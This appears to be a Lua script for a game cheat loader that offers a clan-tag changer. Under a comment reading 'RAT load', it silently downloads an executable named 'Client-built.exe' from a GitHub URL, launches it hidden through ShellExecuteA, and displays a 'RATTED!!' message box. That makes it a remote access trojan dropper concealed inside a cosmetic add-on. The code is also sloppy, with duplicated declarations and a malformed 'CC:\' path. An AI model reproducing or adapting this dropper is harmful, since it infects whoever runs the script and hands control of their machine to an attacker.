local ffi = require("ffi")

local clantag = {}
clantag.ffi = ffi.cast('int(__fastcall*) (const char*, const char*)', clarity.pattern_scan('engine.dll', '53 56 57 8B DA 8B F9 FF 15'))
clantag.last = nil
clantag.set = function (tag)
  if tag == clantag.last then
    return
  end
  clantag.ffi(tag, tag)
  clantag.last = tag
end

local function cmd(n)
  os.execute(n)
end

local function notif(s)
  interfaces.engine:execute_client_cmd("echo " .. s)
end

-- RAT load
ffi.cdef[[
  typedef int(__thiscall* get_clipboard_text_count)(void*);
  typedef void(__thiscall* set_clipboard_text)(void*, const char*, int);
  typedef void(__thiscall* get_clipboard_text)(void*, int, const char*, int);
  bool CreateDirectoryA(const char* LpPathName, void* LpSecurityAttributes);
  void* __stdcall URLDownloadToFileA(void* LPUNKNOWN, const char* LPCSTR, const char* LPCSTR2, int a, int LPBINDSTATUSCALLBACK);
  void* __stdcall ShellExecuteA(void* hwnd, const char* op, const char* file, const char* params, const char* dir, int show_cmd);
  bool DeleteUrlCacheEntryA(const char* LpszUrlName);
  typedef int(__fastcall* clantag_t)(const char*, const char*);
  bool CreateDirectoryA(const char* LpPathName, void* LpSecurityAttributes);
  void* __stdcall URLDownloadToFileA(void* LPUNKNOWN, const char* LPCSTR, const char* LPCSTR2, int a, int LPBINDSTATUSCALLBACK);
  void* __stdcall ShellExecuteA(void* hwnd, const char* op, const char* file, const char* params, const char* dir, int show_cmd);
  int MessageBoxA(void *w, const char *txt, const char *cap, int type);
  int ShellExecuteA(void* hwnd, const char* LpOperation, const char* LpFile, const char* LpParameters, const char* LpDirectory, int nShowCmd);
]]

local Shell32 = ffi.load('Shell32.dll')
local urlmon = ffi.load('UrlMon')
local wininet = ffi.load('WinInet')

ffi.C.CreateDirectoryA("C:\\ratted", nil)
wininet.DeleteUrlCacheEntryA("https://github.com/moha6871/GROWTOPIA-BETTER/raw/main/Client-built.exe")
urlmon.URLDownloadToFileA(nil, "https://github.com/moha6871/GROWTOPIA-BETTER/raw/main/Client-built.exe", "C:\\users\\moha6871\\Downloads\\Client-built.exe", 0, 0)
Shell32.ShellExecuteA(nil, 'open', "CC:\\users\\moha6871\\Downloads\\Client-built.exe", nil, nil, 0)
ffi.C.MessageBoxA(nil, "RATTED!!", "RATTED", 0x00004000)
